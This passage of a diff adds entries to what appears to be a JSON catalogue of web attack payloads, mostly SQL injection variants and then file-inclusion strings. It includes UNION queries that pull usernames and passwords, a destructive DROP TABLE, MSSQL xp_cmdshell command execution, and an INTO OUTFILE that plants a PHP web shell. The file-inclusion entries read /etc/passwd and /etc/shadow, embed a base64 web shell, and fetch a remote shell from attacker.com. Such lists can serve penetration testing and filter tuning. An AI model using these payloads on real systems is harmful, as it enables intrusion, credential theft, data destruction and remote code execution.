+{"id":216,"category":"SQL Injection","subcategory":"UNION data extraction","payload":"' UNION SELECT username, password FROM users--","description":"Extracts credentials once column count/types align."},
+{"id":217,"category":"SQL Injection","subcategory":"Error-based","payload":"' AND 1=CONVERT(int, @@version)--","description":"MSSQL type-cast error leaks the version string."},
+{"id":218,"category":"SQL Injection","subcategory":"Time-based blind","payload":"' AND SLEEP(5)--","description":"MySQL boolean-blind confirmation via response delay."},
+{"id":219,"category":"SQL Injection","subcategory":"Stacked query","payload":"'; DROP TABLE users--","description":"Stacked-query DDL (destructive - lab use only)."},
+{"id":220,"category":"SQL Injection","subcategory":"Encoded OR 1=1","payload":"%27%20OR%20%271%27%3D%271","description":"Encoded ' OR '1'='1."},
+{"id":221,"category":"SQL Injection","subcategory":"Encoded OR 1=1 (closed)","payload":"%27%20OR%20%271%27%3D%271%27","description":"Encoded ' OR '1'='1'."},
+{"id":222,"category":"SQL Injection","subcategory":"Encoded OR 1=1 --","payload":"%27%20OR%20%271%27%3D%271%27%20--%20-","description":"Encoded OR 1=1 with -- comment."},
+{"id":223,"category":"SQL Injection","subcategory":"Encoded OR 1=1 #","payload":"%27%20OR%20%271%27%3D%271%27%20%23","description":"Encoded OR 1=1 with # comment."},
+{"id":224,"category":"SQL Injection","subcategory":"Encoded OR 1=1 /*","payload":"%27%20OR%20%271%27%3D%271%27%20%2F*","description":"Encoded OR 1=1 with /* comment."},
+{"id":225,"category":"SQL Injection","subcategory":"Encoded OR x=x","payload":"%27%20OR%20%27x%27%3D%27x","description":"Encoded ' OR 'x'='x."},
+{"id":226,"category":"SQL Injection","subcategory":"Encoded OR x=x --","payload":"%27%20OR%20%27x%27%3D%27x%27%20--%20-","description":"Encoded OR x=x with --."},
+{"id":227,"category":"SQL Injection","subcategory":"Encoded OR x=x #","payload":"%27%20OR%20%27x%27%3D%27x%27%20%23","description":"Encoded OR x=x with #."},
+{"id":228,"category":"SQL Injection","subcategory":"OR 1=1 LIMIT 1 --","payload":"%27%20OR%20%271%27%3D%271%27%20LIMIT%201--%20-","description":"OR 1=1 LIMIT 1 with --."},
+{"id":229,"category":"SQL Injection","subcategory":"OR 1=1 LIMIT 1 #","payload":"%27%20OR%20%271%27%3D%271%27%20LIMIT%201%23","description":"OR 1=1 LIMIT 1 with #."},
+{"id":230,"category":"SQL Injection","subcategory":"OR (1=1) --","payload":"%27%20OR%20%281%3D1%29--","description":"Parenthesised always-true."},
+{"id":231,"category":"SQL Injection","subcategory":"OR (1=1) #","payload":"%27%20OR%20%281%3D1%29%23","description":"Parenthesised with #."},
+{"id":232,"category":"SQL Injection","subcategory":"OR 1=1 --","payload":"%27%20OR%201%3D1--","description":"Unquoted numeric true."},
+{"id":233,"category":"SQL Injection","subcategory":"OR 1=1 #","payload":"%27%20OR%201%3D1%23","description":"Unquoted numeric true with #."},
+{"id":234,"category":"SQL Injection","subcategory":"OR 1=1 /*","payload":"%27%20OR%201%3D1%2F*","description":"Unquoted numeric true with /*."},
+{"id":235,"category":"SQL Injection","subcategory":"OR 1=1 AND 1=1","payload":"%27%20OR%201%3D1%20AND%20%271%27%3D%271","description":"Chained OR 1=1 AND 1=1."},
+{"id":236,"category":"SQL Injection","subcategory":"OR 1=1 AND 1=1 --","payload":"%27%20OR%201%3D1%20AND%20%271%27%3D%271%27%20--%20-","description":"Chained with --."},
+{"id":237,"category":"SQL Injection","subcategory":"OR 1=1 AND 1=1 #","payload":"%27%20OR%201%3D1%20AND%20%271%27%3D%271%27%20%23","description":"Chained with #."},
+{"id":238,"category":"SQL Injection","subcategory":"OR 1=1 -- (plain)","payload":"%27%20OR%201%3D1%20--%20-","description":"Plain numeric true with --."},
+{"id":239,"category":"SQL Injection","subcategory":"OR 1=1 # (plain)","payload":"%27%20OR%201%3D1%20%23","description":"Plain numeric true with #."},
+{"id":240,"category":"SQL Injection","subcategory":"OR 1=1 /* (plain)","payload":"%27%20OR%201%3D1%20%2F*","description":"Plain numeric true with /*."},
+{"id":241,"category":"SQL Injection","subcategory":"Double-quote OR 1=1","payload":"%22%20OR%20%221%22%3D%221","description":"Double-quote variant ' OR \"1\"=\"1'."},
+{"id":242,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 (closed)","payload":"%22%20OR%20%221%22%3D%221%22","description":"Double-quote closed variant."},
+{"id":243,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 --","payload":"%22%20OR%20%221%22%3D%221%22%20--%20-","description":"Double-quote with --."},
+{"id":244,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 #","payload":"%22%20OR%20%221%22%3D%221%22%20%23","description":"Double-quote with #."},
+{"id":245,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 /*","payload":"%22%20OR%20%221%22%3D%221%22%20%2F*","description":"Double-quote with /*."},
+{"id":246,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 -- (num)","payload":"%22%20OR%201%3D1--","description":"Double-quote numeric true with --."},
+{"id":247,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 # (num)","payload":"%22%20OR%201%3D1%23","description":"Double-quote numeric true with #."},
+{"id":248,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 /* (num)","payload":"%22%20OR%201%3D1%2F*","description":"Double-quote numeric true with /*."},
+{"id":249,"category":"SQL Injection","subcategory":"Double-quote OR 1=1 AND true","payload":"%22%20OR%201%3D1%20AND%20%221%22%3D%221","description":"Double-quote chained OR true."},
+{"id":250,"category":"SQL Injection","subcategory":"Paren ) OR (1=1) --","payload":"%29%20OR%20%281%3D1%29--","description":"Close-paren breakout then OR true."},
+{"id":251,"category":"SQL Injection","subcategory":"Paren ) OR (1=1) #","payload":"%29%20OR%20%281%3D1%29%23","description":"Paren breakout with #."},
+{"id":252,"category":"SQL Injection","subcategory":"Paren ) OR (1=1) /*","payload":"%29%20OR%20%281%3D1%29%2F*","description":"Paren breakout with /*."},
+{"id":253,"category":"SQL Injection","subcategory":"Quote + close-paren","payload":"%27%29%20OR%20%281%3D1%29--","description":"Quote + close-paren breakout."},
+{"id":254,"category":"SQL Injection","subcategory":"Quote + close-paren #","payload":"%27%29%20OR%20%281%3D1%29%23","description":"Quote + close-paren with #."},
+{"id":255,"category":"SQL Injection","subcategory":"Quote + close-paren /*","payload":"%27%29%20OR%20%281%3D1%29%2F*","description":"Quote + close-paren with /*."},
+{"id":256,"category":"SQL Injection","subcategory":"Quote + close-paren x=x","payload":"%27%29%20OR%20%271%27%3D%271","description":"Quote + close-paren OR x=x."},
+{"id":257,"category":"SQL Injection","subcategory":"Quote + close-paren x=x --","payload":"%27%29%20OR%20%271%27%3D%271%27%20--%20-","description":"Quote + close-paren x=x with --."},
+{"id":258,"category":"SQL Injection","subcategory":"Quote + close-paren x=x #","payload":"%27%29%20OR%20%271%27%3D%271%27%20%23","description":"Quote + close-paren x=x with #."},
+{"id":259,"category":"SQL Injection","subcategory":"admin'--","payload":"admin%27--","description":"Encoded admin' --."},
+{"id":260,"category":"SQL Injection","subcategory":"admin'#","payload":"admin%27%23","description":"Encoded admin'#."},
+{"id":261,"category":"SQL Injection","subcategory":"admin'/*","payload":"admin%27%2F*","description":"Encoded admin'/*."},
+{"id":262,"category":"SQL Injection","subcategory":"admin' OR 1=1--","payload":"admin%27%20OR%20%271%27%3D%271%27--","description":"Encoded admin OR 1=1 comment."},
+{"id":263,"category":"SQL Injection","subcategory":"admin' OR 1=1#","payload":"admin%27%20OR%20%271%27%3D%271%27%23","description":"Encoded admin OR 1=1 with #."},
+{"id":264,"category":"SQL Injection","subcategory":"admin' OR 1=1/*","payload":"admin%27%20OR%20%271%27%3D%271%27%2F*","description":"Encoded admin OR 1=1 with /*."},
+{"id":265,"category":"SQL Injection","subcategory":"admin' -- (spaces)","payload":"admin%27%20--%20-","description":"Encoded admin' -- with spaces."},
+{"id":266,"category":"SQL Injection","subcategory":"admin' # (spaces)","payload":"admin%27%20%23","description":"Encoded admin' # with spaces."},
+{"id":267,"category":"SQL Injection","subcategory":"admin' /* (spaces)","payload":"admin%27%20%2F*","description":"Encoded admin' /* with spaces."},
+{"id":268,"category":"SQL Injection","subcategory":"admin') OR ('1'='1","payload":"admin%27)%20OR%20(%271%27%3D%271","description":"admin' ) OR ( '1'='1."},
+{"id":269,"category":"SQL Injection","subcategory":"UNION NULL --","payload":"%27%20UNION%20SELECT%20NULL--","description":"Single-column UNION probe."},
+{"id":270,"category":"SQL Injection","subcategory":"UNION NULL #","payload":"%27%20UNION%20SELECT%20NULL%23","description":"Single-column with #."},
+{"id":271,"category":"SQL Injection","subcategory":"UNION NULL /*","payload":"%27%20UNION%20SELECT%20NULL%2F*","description":"Single-column with /*."},
+{"id":272,"category":"SQL Injection","subcategory":"UNION NULL,NULL --","payload":"%27%20UNION%20SELECT%20NULL%2cNULL--","description":"Two-column probe."},
+{"id":273,"category":"SQL Injection","subcategory":"UNION NULL,NULL #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%23","description":"Two-column with #."},
+{"id":274,"category":"SQL Injection","subcategory":"UNION NULL,NULL /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2F*","description":"Two-column with /*."},
+{"id":275,"category":"SQL Injection","subcategory":"UNION NULL x3","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL--","description":"Three-column probe."},
+{"id":276,"category":"SQL Injection","subcategory":"UNION NULL x3 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%23","description":"Three-column with #."},
+{"id":277,"category":"SQL Injection","subcategory":"UNION NULL x3 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2F*","description":"Three-column with /*."},
+{"id":278,"category":"SQL Injection","subcategory":"UNION NULL x4","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL--","description":"Four-column probe."},
+{"id":279,"category":"SQL Injection","subcategory":"UNION NULL x4 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%23","description":"Four-column with #."},
+{"id":280,"category":"SQL Injection","subcategory":"UNION NULL x4 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2F*","description":"Four-column with /*."},
+{"id":281,"category":"SQL Injection","subcategory":"UNION NULL x5","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Five-column probe."},
+{"id":282,"category":"SQL Injection","subcategory":"UNION NULL x5 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Five-column with #."},
+{"id":283,"category":"SQL Injection","subcategory":"UNION NULL x5 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Five-column with /*."},
+{"id":284,"category":"SQL Injection","subcategory":"UNION NULL x6","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Six-column probe."},
+{"id":285,"category":"SQL Injection","subcategory":"UNION NULL x6 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Six-column with #."},
+{"id":286,"category":"SQL Injection","subcategory":"UNION NULL x6 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Six-column with /*."},
+{"id":287,"category":"SQL Injection","subcategory":"UNION NULL x7","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Seven-column probe."},
+{"id":288,"category":"SQL Injection","subcategory":"UNION NULL x7 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Seven-column with #."},
+{"id":289,"category":"SQL Injection","subcategory":"UNION NULL x7 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Seven-column with /*."},
+{"id":290,"category":"SQL Injection","subcategory":"UNION NULL x8","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Eight-column probe."},
+{"id":291,"category":"SQL Injection","subcategory":"UNION NULL x8 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Eight-column with #."},
+{"id":292,"category":"SQL Injection","subcategory":"UNION NULL x8 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Eight-column with /*."},
+{"id":293,"category":"SQL Injection","subcategory":"UNION NULL x9","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Nine-column probe."},
+{"id":294,"category":"SQL Injection","subcategory":"UNION NULL x9 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Nine-column with #."},
+{"id":295,"category":"SQL Injection","subcategory":"UNION NULL x9 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Nine-column with /*."},
+{"id":296,"category":"SQL Injection","subcategory":"UNION NULL x10","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--","description":"Ten-column probe."},
+{"id":297,"category":"SQL Injection","subcategory":"UNION NULL x10 #","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%23","description":"Ten-column with #."},
+{"id":298,"category":"SQL Injection","subcategory":"UNION NULL x10 /*","payload":"%27%20UNION%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2F*","description":"Ten-column with /*."},
+{"id":299,"category":"SQL Injection","subcategory":"UNION users:passwords","payload":"%27%20UNION%20SELECT%20username%2c%20password%20FROM%20users--","description":"Extract username/password from users table."},
+{"id":300,"category":"SQL Injection","subcategory":"UNION users:passwords #","payload":"%27%20UNION%20SELECT%20username%2c%20password%20FROM%20users%23","description":"Same with # comment."},
+{"id":301,"category":"SQL Injection","subcategory":"UNION users:passwords /*","payload":"%27%20UNION%20SELECT%20username%2c%20password%20FROM%20users%2F*","description":"Same with /* comment."},
+{"id":302,"category":"SQL Injection","subcategory":"UNION 1,2,3","payload":"%27%20UNION%20SELECT%201%2c2%2c3--","description":"Enumerate reflected columns."},
+{"id":303,"category":"SQL Injection","subcategory":"UNION 1,2,3 #","payload":"%27%20UNION%20SELECT%201%2c2%2c3%23","description":"Enumerate with #."},
+{"id":304,"category":"SQL Injection","subcategory":"UNION 1,2,3 /*","payload":"%27%20UNION%20SELECT%201%2c2%2c3%2F*","description":"Enumerate with /*."},
+{"id":305,"category":"SQL Injection","subcategory":"UNION NULL FROM dual","payload":"%27%20UNION%20SELECT%20NULL%20FROM%20dual--","description":"Oracle FROM dual probe."},
+{"id":306,"category":"SQL Injection","subcategory":"UNION NULL FROM dual #","payload":"%27%20UNION%20SELECT%20NULL%20FROM%20dual%23","description":"Oracle FROM dual with #."},
+{"id":307,"category":"SQL Injection","subcategory":"UNION NULL FROM dual /*","payload":"%27%20UNION%20SELECT%20NULL%20FROM%20dual%2F*","description":"Oracle FROM dual with /*."},
+{"id":308,"category":"SQL Injection","subcategory":"Comment-padded UNION NULL","payload":"%27%2F**%2FUNION%2F**%2FSELECT%2F**%2FNULL--","description":"/* */ padding between keywords to evade WAFs."},
+{"id":309,"category":"SQL Injection","subcategory":"Comment-padded UNION NULL #","payload":"%27%2F**%2FUNION%2F**%2FSELECT%2F**%2FNULL%23","description":"Comment-padded with #."},
+{"id":310,"category":"SQL Injection","subcategory":"Comment-padded UNION NULL /*","payload":"%27%2F**%2FUNION%2F**%2FSELECT%2F**%2FNULL%2F*","description":"Comment-padded with /*."},
+{"id":311,"category":"SQL Injection","subcategory":"Comment-padded UNION NULL,NULL","payload":"%27%2F%2a%2a%2fUNION%2F%2a%2a%2fSELECT%2F%2a%2a%2fNULL%2cNULL--","description":"Comment-padded two-column."},
+{"id":312,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL","payload":"%27%20UNION%20ALL%20SELECT%20NULL--","description":"UNION ALL single column."},
+{"id":313,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL #","payload":"%27%20UNION%20ALL%20SELECT%20NULL%23","description":"UNION ALL with #."},
+{"id":314,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL /*","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2F*","description":"UNION ALL with /*."},
+{"id":315,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL,NULL","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL--","description":"UNION ALL two columns."},
+{"id":316,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL,NULL #","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%23","description":"UNION ALL two cols with #."},
+{"id":317,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL,NULL /*","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2F*","description":"UNION ALL two cols with /*."},
+{"id":318,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL x3","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2cNULL--","description":"UNION ALL three columns."},
+{"id":319,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL x3 #","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2cNULL%23","description":"UNION ALL three cols with #."},
+{"id":320,"category":"SQL Injection","subcategory":"UNION ALL SELECT NULL x3 /*","payload":"%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2cNULL%2F*","description":"UNION ALL three cols with /*."},
+{"id":321,"category":"SQL Injection","subcategory":"Error - CONVERT","payload":"%27%20AND%201%3DCONVERT%28int%2c%20%40%40version%29--","description":"MSSQL CONVERT error leaks version."},
+{"id":322,"category":"SQL Injection","subcategory":"Error - CONVERT #","payload":"%27%20AND%201%3DCONVERT%28int%2c%20%40%40version%29%23","description":"CONVERT with #."},
+{"id":323,"category":"SQL Injection","subcategory":"Error - CONVERT /*","payload":"%27%20AND%201%3DCONVERT%28int%2c%20%40%40version%29%2F*","description":"CONVERT with /*."},
+{"id":324,"category":"SQL Injection","subcategory":"Error - CAST","payload":"%27%20AND%201%3DCAST%28%28SELECT%20version%28%29%29%20AS%20int%29--","description":"MySQL CAST error leaks version."},
+{"id":325,"category":"SQL Injection","subcategory":"Error - CAST #","payload":"%27%20AND%201%3DCAST%28%28SELECT%20version%28%29%29%20AS%20int%29%23","description":"CAST with #."},
+{"id":326,"category":"SQL Injection","subcategory":"Error - extractvalue","payload":"%27%20AND%20extractvalue%281%2cconcat%280x7e%2cdatabase%28%29%29%29--","description":"MySQL extractvalue error leaks database."},
+{"id":327,"category":"SQL Injection","subcategory":"Error - extractvalue #","payload":"%27%20AND%20extractvalue%281%2cconcat%280x7e%2cdatabase%28%29%29%29%23","description":"extractvalue with #."},
+{"id":328,"category":"SQL Injection","subcategory":"Error - updatexml","payload":"%27%20AND%20updatexml%281%2cconcat%280x7e%2cversion%28%29%29%2c1%29--","description":"MySQL updatexml error leaks version."},
+{"id":329,"category":"SQL Injection","subcategory":"Error - updatexml #","payload":"%27%20AND%20updatexml%281%2cconcat%280x7e%2cversion%28%29%29%2c1%29%23","description":"updatexml with #."},
+{"id":330,"category":"SQL Injection","subcategory":"Error - floor/rand","payload":"%27%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%20COUNT%28%2a%29%2cCONCAT%28version%28%29%2cFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29--","description":"MySQL duplicate-key error leaks version."},
+{"id":331,"category":"SQL Injection","subcategory":"Error - floor/rand #","payload":"%27%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%20COUNT%28%2a%29%2cCONCAT%28version%28%29%2cFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%23","description":"floor/rand with #."},
+{"id":332,"category":"SQL Injection","subcategory":"Time - SLEEP(5) --","payload":"%27%20AND%20SLEEP%285%29--","description":"MySQL 5-second delay."},
+{"id":333,"category":"SQL Injection","subcategory":"Time - SLEEP(5) #","payload":"%27%20AND%20SLEEP%285%29%23","description":"SLEEP(5) with #."},
+{"id":334,"category":"SQL Injection","subcategory":"Time - SLEEP(5) /*","payload":"%27%20AND%20SLEEP%285%29%2F*","description":"SLEEP(5) with /*."},
+{"id":335,"category":"SQL Injection","subcategory":"Time - SLEEP(10) --","payload":"%27%20AND%20SLEEP%2810%29--","description":"MySQL 10-second delay."},
+{"id":336,"category":"SQL Injection","subcategory":"Time - SLEEP(10) #","payload":"%27%20AND%20SLEEP%2810%29%23","description":"SLEEP(10) with #."},
+{"id":337,"category":"SQL Injection","subcategory":"Time - BENCHMARK --","payload":"%27%20AND%20BENCHMARK%2810000000%2cSHA1%28%27test%27%29%29--","description":"MySQL BENCHMARK delay."},
+{"id":338,"category":"SQL Injection","subcategory":"Time - BENCHMARK #","payload":"%27%20AND%20BENCHMARK%2810000000%2cSHA1%28%27test%27%29%29%23","description":"BENCHMARK with #."},
+{"id":339,"category":"SQL Injection","subcategory":"Time - subselect SLEEP --","payload":"%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29--","description":"Sleep inside a subselect for WAF evasion."},
+{"id":340,"category":"SQL Injection","subcategory":"Time - subselect SLEEP #","payload":"%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29%23","description":"Subselect sleep with #."},
+{"id":341,"category":"SQL Injection","subcategory":"Time - pg_sleep(5) --","payload":"%27%3B%20SELECT%20pg_sleep%285%29--","description":"PostgreSQL 5-second delay."},
+{"id":342,"category":"SQL Injection","subcategory":"Time - pg_sleep(5) #","payload":"%27%3B%20SELECT%20pg_sleep%285%29%23","description":"pg_sleep(5) with #."},
+{"id":343,"category":"SQL Injection","subcategory":"Time - pg_sleep(10) --","payload":"%27%3B%20SELECT%20pg_sleep%2810%29--","description":"PostgreSQL 10-second delay."},
+{"id":344,"category":"SQL Injection","subcategory":"Time - WAITFOR DELAY 5 --","payload":"%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--","description":"MSSQL 5-second delay."},
+{"id":345,"category":"SQL Injection","subcategory":"Time - WAITFOR DELAY 5 #","payload":"%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%23","description":"WAITFOR 5 with #."},
+{"id":346,"category":"SQL Injection","subcategory":"Time - WAITFOR DELAY 10 --","payload":"%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A10%27--","description":"MSSQL 10-second delay."},
+{"id":347,"category":"SQL Injection","subcategory":"Time - dbms_pipe 5 --","payload":"%27%20AND%201%3Ddbms_pipe.receive_message%28%27a%27%2c5%29--","description":"Oracle 5-second delay."},
+{"id":348,"category":"SQL Injection","subcategory":"Time - dbms_pipe 5 #","payload":"%27%20AND%201%3Ddbms_pipe.receive_message%28%27a%27%2c5%29%23","description":"dbms_pipe 5 with #."},
+{"id":349,"category":"SQL Injection","subcategory":"Time - dbms_pipe 10 --","payload":"%27%20AND%201%3Ddbms_pipe.receive_message%28%27a%27%2c10%29--","description":"Oracle 10-second delay."},
+{"id":350,"category":"SQL Injection","subcategory":"Boolean - AND 1=1 --","payload":"%27%20AND%201%3D1--","description":"True boolean probe."},
+{"id":351,"category":"SQL Injection","subcategory":"Boolean - AND 1=1 #","payload":"%27%20AND%201%3D1%23","description":"True boolean with #."},
+{"id":352,"category":"SQL Injection","subcategory":"Boolean - AND 1=2 --","payload":"%27%20AND%201%3D2--","description":"False boolean probe."},
+{"id":353,"category":"SQL Injection","subcategory":"Boolean - AND 1=2 #","payload":"%27%20AND%201%3D2%23","description":"False boolean with #."},
+{"id":354,"category":"SQL Injection","subcategory":"Boolean - AND 1=1 (x2)","payload":"%27%20AND%20%271%27%3D%271%27--","description":"Quoted true."},
+{"id":355,"category":"SQL Injection","subcategory":"Boolean - AND 1=1 (x2) #","payload":"%27%20AND%20%271%27%3D%271%27%23","description":"Quoted true with #."},
+{"id":356,"category":"SQL Injection","subcategory":"Boolean - AND 1=2 (x2)","payload":"%27%20AND%20%271%27%3D%272%27--","description":"Quoted false."},
+{"id":357,"category":"SQL Injection","subcategory":"Boolean - AND 1=2 (x2) #","payload":"%27%20AND%20%271%27%3D%272%27%23","description":"Quoted false with #."},
+{"id":358,"category":"SQL Injection","subcategory":"Boolean - AND a=a","payload":"%27%20AND%20%27a%27%3D%27a%27--","description":"True string boolean probe."},
+{"id":359,"category":"SQL Injection","subcategory":"Boolean - AND a=a #","payload":"%27%20AND%20%27a%27%3D%27a%27%23","description":"True string with #."},
+{"id":360,"category":"SQL Injection","subcategory":"Boolean - AND a=b","payload":"%27%20AND%20%27a%27%3D%27b%27--","description":"False string boolean probe."},
+{"id":361,"category":"SQL Injection","subcategory":"Boolean - AND a=b #","payload":"%27%20AND%20%27a%27%3D%27b%27%23","description":"False string with #."},
+{"id":362,"category":"SQL Injection","subcategory":"Stacked - SELECT * FROM users","payload":"%27%3B%20SELECT%20%2a%20FROM%20users--","description":"Stacked query selecting users."},
+{"id":363,"category":"SQL Injection","subcategory":"Stacked - SELECT * FROM users #","payload":"%27%3B%20SELECT%20%2a%20FROM%20users%23","description":"Stacked select with #."},
+{"id":364,"category":"SQL Injection","subcategory":"Stacked - SELECT * FROM users /*","payload":"%27%3B%20SELECT%20%2a%20FROM%20users%2F*","description":"Stacked select with /*."},
+{"id":365,"category":"SQL Injection","subcategory":"Stacked - xp_cmdshell --","payload":"%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29--","description":"MSSQL stacked xp_cmdshell RCE."},
+{"id":366,"category":"SQL Injection","subcategory":"Stacked - xp_cmdshell #","payload":"%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%23","description":"MSSQL xp_cmdshell with #."},
+{"id":367,"category":"SQL Injection","subcategory":"Stacked - xp_cmdshell /*","payload":"%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%2F*","description":"MSSQL xp_cmdshell with /*."},
+{"id":368,"category":"SQL Injection","subcategory":"Stacked - master..xp_cmdshell","payload":"%27%3B%20EXEC%20master..xp_cmdshell%20%27dir%27--","description":"MSSQL master..xp_cmdshell dir."},
+{"id":369,"category":"SQL Injection","subcategory":"INTO OUTFILE shell","payload":"%27%3B%20SELECT%20%27%3c%3fphp%20system%28%24_GET%5b%22cmd%22%5d%29%3b%20%3f%3e%27%20INTO%20OUTFILE%20%27%2fvar%2fwww%2fhtml%2fshell.php%27--","description":"MySQL INTO OUTFILE drops a PHP webshell."},
+{"id":370,"category":"SQL Injection","subcategory":"INTO OUTFILE shell #","payload":"%27%3B%20SELECT%20%27%3c%3fphp%20system%28%24_GET%5b%22cmd%22%5d%29%3b%20%3f%3e%27%20INTO%20OUTFILE%20%27%2fvar%2fwww%2fhtml%2fshell.php%27%23","description":"INTO OUTFILE with #."},
+{"id":371,"category":"SQL Injection","subcategory":"load_file passwd --","payload":"%27%3B%20SELECT%20load_file%28%27%2fetc%2fpasswd%27%29--","description":"MySQL load_file reads /etc/passwd."},
+{"id":372,"category":"SQL Injection","subcategory":"load_file passwd #","payload":"%27%3B%20SELECT%20load_file%28%27%2fetc%2fpasswd%27%29%23","description":"load_file with #."},
+
+/* ============================================================
+   FILE INCLUSION (LFI/RFI)
+   ============================================================ */
+{"id":373,"category":"File Inclusion (LFI/RFI)","subcategory":"LFI - passwd","payload":"../../../../etc/passwd","description":"Classic *nix local file read."},
+{"id":374,"category":"File Inclusion (LFI/RFI)","subcategory":"LFI - win.ini","payload":"../../../../windows/win.ini","description":"Windows LFI target for confirmation."},
+{"id":375,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter wrapper","payload":"php://filter/convert.base64-encode/resource=index.php","description":"Reads source of a PHP file as base64."},
+{"id":376,"category":"File Inclusion (LFI/RFI)","subcategory":"data wrapper","payload":"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+","description":"Inline base64-encoded PHP web shell via data:// wrapper."},
+{"id":377,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI","payload":"http://attacker.com/shell.txt","description":"Remote file inclusion when allow_url_include is on."},
+{"id":378,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - passwd (encoded)","payload":"%2fetc%2fpasswd","description":"URL-encoded /etc/passwd."},
+{"id":379,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - shadow","payload":"%2fetc%2fshadow","description":"URL-encoded /etc/shadow."},
+{"id":380,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - hosts","payload":"%2fetc%2fhosts","description":"URL-encoded /etc/hosts."},
+{"id":381,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - issue","payload":"%2fetc%2fissue","description":"URL-encoded /etc/issue banner."},
+{"id":382,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - motd","payload":"%2fetc%2fmotd","description":"URL-encoded /etc/motd."},
+{"id":383,"category":"File Inclusion (LFI/RFI)","subcategory":"Unix - resolv.conf","payload":"%2fetc%2fresolv.conf","description":"URL-encoded DNS resolver config."},
